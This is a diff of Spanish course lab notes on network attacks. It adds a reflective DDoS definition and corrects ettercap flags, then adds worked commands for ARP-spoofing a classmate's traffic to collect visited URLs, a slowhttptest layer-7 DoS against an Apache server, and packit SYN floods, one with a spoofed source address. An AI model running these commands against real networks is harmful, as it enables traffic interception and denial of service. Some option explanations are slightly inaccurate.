@@ -22,6 +22,8 @@ rsyslog por puerto 514
 
 **DDoS** -> Distributed Denial of Service. Similar a DoS, salvo que se emplean múltiples máquinas comprometidas (botnet) para realizar el ataque.
 
+**DDoS reflective attack** -> Se mandan muchas peticiones a servidores modificadas para que parezca que una victima las está realizando, con la intención de saturarla
+
 **MITM** -> Siglas de Man In The Middle. Ataques de intercepción.
 
 **ICMP Redirect** -> Mensajes empleados principalmente por routers para indicar rutas más óptimas por las que pasar paquetes. Puede ser explotado para que una máquina víctima asigne a la máquina del atacante como default gateway.
@@ -43,12 +45,12 @@ Como hemos instalado la versión sin interfaz gráfica, es conveniente conocer l
 Un ejemplo sería el comando:
 
 ```shell
-ettercap -I ens33 -Tq -P repoison_arp -w /home/lsi/Escritorio/archivo -M arp:remote /ip compañero// /ip router//
+ettercap -i ens33 -Tq -P repoison_arp -w /home/lsi/Escritorio/archivo -M arp:remote /ip compañero// /ip router//
 ```
 
 A continuación mostramos una breve explicación de las opciones:
 
-**-I ens33** -> Especifica la interfaz de red que empleamos para realizar el ataque, en este caso ens33
+**-i ens33** -> Especifica la interfaz de red que empleamos para realizar el ataque, en este caso ens33
 **-Tq** -> indica que el comando se ejecuta en modo texto y que no muestre los contenidos por la terminal
 **-M arp:remote** -> Indica el ataque a realizar, en este caso un ataque de ARP poisoning entre una máquina y un router
 **-P repoison_arp** -> Especifica el plugin que empleamos, en este caso repoison_arp. Este plugin en concreto
@@ -73,7 +75,7 @@ Para realizar este apartado correctamente debemos instalar wireshark en nuestro 
 A continuación realizamos un ataque de ARP Spoofing:
 
 ```shell
-ettercap -I ens33 -Tq -P remote_browser -w /home/lsi/Escritorio/archivo -M arp:remote /ip compañero// /ip router//
+ettercap -i ens33 -Tq -P remote_browser -w /home/lsi/Escritorio/archivo -M arp:remote /ip compañero// /ip router//
 ```
 
 Mientras que el la víctima usa un navegador de texto (como lynx).
@@ -105,6 +107,22 @@ nmap -sP 10.11.48.0/23
 
 ##### f) Mediante arpspoofing entre una máquina objetivo (víctima) y el router del laboratorio obtenga todas las URL HTTP visitadas por la víctima. 
 
+Ejecutamos ettercap:
+
+```shell
+ettercap -i ens33 -Tq -P remote_browser -w /home/lsi/Escritorio/archivo.cap -M arp:remote /ip compañero// /ip router//
+```
+
+mientras el compañero navega con el navegador lynx y emplea el comando curl.
+
+Tras terminas el ataque en nuestra máquina recibimos una copia del archivo con:
+
+```shell
+scp lsi@ip:/home/lsi/Escritorio/archivo.cap C:/Directiorio/Destino
+```
+
+Y lo analizamos con la herramienta Wireshark.
+
 ##### g) Instale metasploit. Haga un ejecutable que incluya un Reverse TCP meterpreter payload para plataformas linux. Inclúyalo en un filtro ettercap y aplique toda su sabiduría en ingeniería social para que una víctima u objetivo lo ejecute. 
 
 ##### h) Haga un MITM en IPv6 y visualice la paquetería. 
@@ -124,6 +142,52 @@ nmap -sP 10.11.48.0/23
 ##### m) PARA PLANTEAR DE FORMA TEÓRICA.: ¿Cómo podría hacer un DoS de tipo direct attack contra un equipo de la red de prácticas? ¿Y mediante un DoS de tipo reflective flooding attack?. 
 
 ##### n) Ataque un servidor apache instalado en algunas de las máquinas del laboratorio de prácticas para tratar de provocarle una DoS. Utilice herramientas DoS que trabajen a nivel de aplicación (capa 7). ¿Cómo podría proteger dicho servicio ante este tipo de ataque? ¿Y si se produjese desde fuera de su segmento de red? ¿Cómo podría tratar de saltarse dicha protección? 
+
+Instalamos la herramienta slowhttptest:
+
+```shell
+apt install slowhttptest
+```
+
+Y ejecutamos un comando con una estructura similar al siguiente:
+
+```shell
+slowhttptest -c 1000 -g -X -o slow-file -r 200 -w 512 -y 1024 -n 5 -z 32 -K 3 -u http://IPcompañero -p 3
+```
+
+Expliquemos las opciones del comando:
+
+**-c 1000** -> Establece el número de conexiones que se van a realizar, en este caso 1000
+**-g** -> Activa la generación de gráficos
+**-X** -> Indica el tipo de peticiones HTTP que se van a usar para el ataque. Las opciones son:
+1. **-X** -> para usar peticiones GET
+2. **-H** -> para usar peticiones HEAD
+3. **-B** -> para usar peticiones POST
+**-o slow-file** -> para indicar que los datos se guardarán en el archivo indicado
+**-r 200** -> Indica el número de conexiones que se establecerán por segundo (200 en este caso)
+**-w 512 -y 1024** -> ventana de la petición inicial + tamaño de los datos posteriores
+**-n 5** -> intervalo en segundos de lectura de los datos almacenados en el buffer
+**-z 32** -> tiempo en segundos para que se cierren las conexiones en caso de inactividad
+**-u http:// IPcompañero** -> Dirección del servidor víctima
+**-p 3** -> Intervalo en segundos entre peticiones HTTP
+
+Otra herramienta útil es packit, para realizar floodeos sync:
+
+```shell
+apt install packit
+```
+
+Y ejecutamos un comando con una estructura similar al siguiente:
+
+```shell
+packit -c 0 -b 0 -s 10.11.48.200 -d 10.11.48.100 -FS -S 1000 -D 22 -sR 
+```
+
+para Flood directo, o:
+
+```shell
+packit -c 0 -b 0 -s IPorigen -dR -FS -S 22 -D 80
+```
 
 ##### o) Instale y configure modsecurity. Vuelva a proceder con el ataque del apartado anterior. ¿Qué acontece ahora? 
 
